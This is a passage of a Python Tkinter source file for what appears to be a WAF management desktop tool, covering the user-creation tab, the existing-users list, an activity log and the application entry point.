            self.run_test_btn.config(state="normal")

        thread = threading.Thread(target=test_thread, daemon=True)
        thread.start()
    
    # ==========================================
    # TAB 3: USER MANAGEMENT
    # ==========================================
    
    def setup_user_management_tab(self):
        # Info Frame
        info_frame = ttk.LabelFrame(self.user_tab, text="User Management", padding=15)
        info_frame.pack(fill="x", padx=20, pady=20)

        info_text = (
            "Create new users for the WAF application.\n"
            "Users will be stored in the database with hashed passwords."
        )
        tk.Label(info_frame, text=info_text, justify="left", font=("Arial", 10)).pack(anchor="w")

        # Container for Create and Existing Users
        main_container = tk.Frame(self.user_tab)
        main_container.pack(fill="both", expand=True, padx=20, pady=20)

        # Left side - Create User Form
        left_frame = tk.Frame(main_container)
        left_frame.pack(side="left", fill="both", expand=True, padx=(0, 10))

        form_frame = ttk.LabelFrame(left_frame, text="Create New User", padding=20)
        form_frame.pack(fill="x")

        tk.Label(form_frame, text="Username:", font=("Arial", 11, "bold")).grid(row=0, column=0, sticky="w", padx=10, pady=10)
        self.username_entry = tk.Entry(form_frame, width=30, font=("Arial", 11))
        self.username_entry.grid(row=0, column=1, padx=10, pady=10, sticky="w")

        tk.Label(form_frame, text="Password:", font=("Arial", 11, "bold")).grid(row=1, column=0, sticky="w", padx=10, pady=10)
        self.password_entry = tk.Entry(form_frame, width=30, font=("Arial", 11), show="*")
        self.password_entry.grid(row=1, column=1, padx=10, pady=10, sticky="w")

        tk.Label(form_frame, text="Confirm Password:", font=("Arial", 11, "bold")).grid(row=2, column=0, sticky="w", padx=10, pady=10)
        self.confirm_password_entry = tk.Entry(form_frame, width=30, font=("Arial", 11), show="*")
        self.confirm_password_entry.grid(row=2, column=1, padx=10, pady=10, sticky="w")

        # Show password checkbox
        self.show_password_var = tk.BooleanVar()
        show_pass_cb = tk.Checkbutton(
            form_frame,
            text="Show passwords",
            variable=self.show_password_var,
            command=self.toggle_password_visibility,
            font=("Arial", 9)
        )
        show_pass_cb.grid(row=3, column=1, sticky="w", padx=10)

        # Buttons
        button_frame = tk.Frame(left_frame)
        button_frame.pack(pady=20)

        create_btn = tk.Button(
            button_frame,
            text="👤 Create User",
            command=self.create_user,
            bg="#28a745",
            fg="white",
            font=("Arial", 12, "bold"),
            padx=30,
            pady=10,
            cursor="hand2"
        )
        create_btn.pack(side="left", padx=5)

        clear_btn = tk.Button(
            button_frame,
            text="🔄 Clear Form",
            command=self.clear_user_form,
            bg="#6c757d",
            fg="white",
            font=("Arial", 12, "bold"),
            padx=30,
            pady=10,
            cursor="hand2"
        )
        clear_btn.pack(side="left", padx=5)

        # Right side - Existing Users List
        right_frame = tk.Frame(main_container)
        right_frame.pack(side="right", fill="both", expand=True, padx=(10, 0))

        users_frame = ttk.LabelFrame(right_frame, text="Existing Users", padding=10)
        users_frame.pack(fill="both", expand=True)

        # Treeview for users list
        tree_frame = tk.Frame(users_frame)
        tree_frame.pack(fill="both", expand=True)

        # Scrollbar
        scrollbar = ttk.Scrollbar(tree_frame)
        scrollbar.pack(side="right", fill="y")

        # Treeview
        self.users_tree = ttk.Treeview(
            tree_frame,
            columns=("ID", "Username", "Created At"),
            show="headings",
            height=10,
            yscrollcommand=scrollbar.set
        )
        scrollbar.config(command=self.users_tree.yview)

        # Define columns
        self.users_tree.heading("ID", text="ID")
        self.users_tree.heading("Username", text="Username")
        self.users_tree.heading("Created At", text="Created At")

        self.users_tree.column("ID", width=50, anchor="center")
        self.users_tree.column("Username", width=150, anchor="w")
        self.users_tree.column("Created At", width=200, anchor="w")

        self.users_tree.pack(fill="both", expand=True)

        # Refresh button
        refresh_btn = tk.Button(
            users_frame,
            text="🔄 Refresh User List",
            command=self.refresh_users_list,
            bg="#007bff",
            fg="white",
            font=("Arial", 10, "bold"),
            padx=20,
            pady=8,
            cursor="hand2"
        )
        refresh_btn.pack(pady=10)

        # Status/Log Frame
        log_frame = ttk.LabelFrame(self.user_tab, text="Activity Log", padding=10)
        log_frame.pack(fill="both", expand=True, padx=20, pady=20)

        self.user_log_text = scrolledtext.ScrolledText(
            log_frame,
            wrap=tk.WORD,
            height=8,
            font=("Courier", 10)
        )
        self.user_log_text.pack(fill="both", expand=True)

        # Initial log message and load users
        self.log_user_activity("User management system ready.")
        self.log_user_activity("Enter username and password to create a new user.")
        self.refresh_users_list()
    
    def toggle_password_visibility(self):
        if self.show_password_var.get():
            self.password_entry.config(show="")
            self.confirm_password_entry.config(show="")
        else:
            self.password_entry.config(show="*")
            self.confirm_password_entry.config(show="*")
    
    def create_user(self):
        username = self.username_entry.get().strip()
        password = self.password_entry.get()
        confirm_password = self.confirm_password_entry.get()
        
        # Validation
        if not username:
            messagebox.showerror("Error", "Username cannot be empty!")
            return
        
        if not password:
            messagebox.showerror("Error", "Password cannot be empty!")
            return
        
        if password != confirm_password:
            messagebox.showerror("Error", "Passwords do not match!")
            return
        
        if len(password) < 4:
            messagebox.showerror("Error", "Password must be at least 4 characters long!")
            return
        
        # Try to create user
        try:
            # Initialize database first
            init_db()
            
            # Create user
            db_create_user(username, password)
            
            self.log_user_activity(f"✅ SUCCESS: User '{username}' created successfully!")
            self.log_user_activity(f"   Username: {username}")
            self.log_user_activity(f"   Password: {'*' * len(password)} (hashed in database)")
            self.log_user_activity("")
            
            messagebox.showinfo(
                "Success",
                f"User '{username}' created successfully!\n\n"
                f"Username: {username}\n"
                f"Password: {password}\n\n"
                f"You can now login to the WAF application."
            )
            
            # Clear form
            self.clear_user_form()

            # Refresh users list
            self.refresh_users_list()

        except Exception as e:
            error_msg = str(e)
            if "UNIQUE constraint failed" in error_msg:
                self.log_user_activity(f"❌ ERROR: Username '{username}' already exists!")
                messagebox.showerror(
                    "Error",
                    f"Username '{username}' already exists!\n"
                    f"Please choose a different username."
                )
            else:
                self.log_user_activity(f"❌ ERROR: Could not create user: {error_msg}")
                messagebox.showerror("Error", f"Failed to create user:\n{error_msg}")
    
    def clear_user_form(self):
        self.username_entry.delete(0, tk.END)
        self.password_entry.delete(0, tk.END)
        self.confirm_password_entry.delete(0, tk.END)
        self.show_password_var.set(False)
        self.toggle_password_visibility()
    
    def log_user_activity(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.user_log_text.insert(tk.END, f"[{timestamp}] {message}\n")
        self.user_log_text.see(tk.END)

    def refresh_users_list(self):
        '''Fetch and display all users from the database'''
        try:
            # Clear existing items
            for item in self.users_tree.get_children():
                self.users_tree.delete(item)

            # Initialize database
            init_db()

            # Get all users
            users = get_all_users()

            # Populate treeview
            for user in users:
                # Format the created_at timestamp
                created_at = user['created_at']
                try:
                    # Try to parse and format the datetime
                    dt = datetime.fromisoformat(created_at.replace(' ', 'T'))
                    formatted_date = dt.strftime("%Y-%m-%d %H:%M:%S")
                except:
                    formatted_date = created_at

                self.users_tree.insert(
                    "",
                    "end",
                    values=(user['id'], user['username'], formatted_date)
                )

            self.log_user_activity(f"📋 Loaded {len(users)} user(s) from database.")

        except Exception as e:
            self.log_user_activity(f"❌ Error loading users: {str(e)}")

def main():
    root = tk.Tk()
    app = WAFManagementSuite(root)
    root.mainloop()

if __name__ == "__main__":
    main()